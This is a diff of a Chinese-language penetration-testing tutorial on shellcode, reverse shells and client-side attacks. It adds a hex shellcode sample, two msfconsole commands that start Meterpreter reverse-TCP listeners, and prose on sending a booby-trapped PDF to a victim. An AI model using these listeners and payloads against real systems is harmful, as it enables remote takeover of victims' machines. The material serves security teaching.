@@ -42,7 +42,21 @@
 
 让我们把单词 shellcode 分解成 shell 和 code。简单来说，shellcode 是一种旨在给目标系统提供 shell 访问权限的代码。实际上，shellcode 可以做的远不止提供 shell 访问权限。这完全取决于 shellcode 中定义的操作。为了执行客户端攻击，我们需要选择精确的 shellcode 作为有效载荷的一部分。假设目标系统存在某种漏洞，攻击者可以编写一个 shellcode 来利用该漏洞。Shellcode 通常是十六进制编码的数据，可能看起来像这样：
 
-[PRE0]
+```
+"
+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
+ "\x51\x68\x6c\x6c\x20\x20\x68\x33"
+ "\x32\x2e\x64\x68\x75\x73\x65\x72"
+ "\x89\xe1\xbb\x7b\x1d\x80\x7c\x51"
+ "\xff\xd3\xb9\x5e\x67\x30\xef\x81"
+ "\xc1\x11\x11\x11\x11\x51\x68\x61"
+ "\x67\x65\x42\x68\x4d\x65\x73\x73"
+ "\x89\xe1\x51\x50\xbb\x40\xae\x80"
+ "\x7c\xff\xd3\x89\xe1\x31\xd2\x52"
+ "\x51\x51\x52\xff\xd0\x31\xc0\x50"
+ "\xb8\x12\xcb\x81\x7c\xff\xd0" 
+"
+```
 
 # 什么是反向 Shell？
 
@@ -101,7 +115,9 @@
 
 一旦我们生成了一个载荷，我们需要设置一个监听器，一旦在目标系统上执行了载荷，它将接受反向连接。以下命令将在 IP 地址`192.168.44.134`上的端口`8080`上启动一个 meterpreter 监听器：
 
-[PRE1]
+```
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.44.134; set LPORT 8080; run; exit -y"
+```
 
 ![](img/61aaa5da-67dc-4c3f-999a-ebce60a4f57f.jpg)
 
@@ -139,7 +155,9 @@
 
 PDF 文件已在目录`/root/.set/`中生成。现在我们需要使用任何可用的通信媒介将其发送给我们的受害者。同时，我们还需要启动一个监听器，该监听器将接受来自目标的反向 meterpreter 连接。我们可以使用以下命令启动监听器：
 
-[PRE2]
+```
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.44.134; set LPORT 443; run; exit -y"
+```
 
 另一方面，我们的受害者收到了 PDF 文件，并尝试使用 Adobe Reader 打开它。Adobe Reader 崩溃了，但没有迹象表明受害者受到了威胁：
 
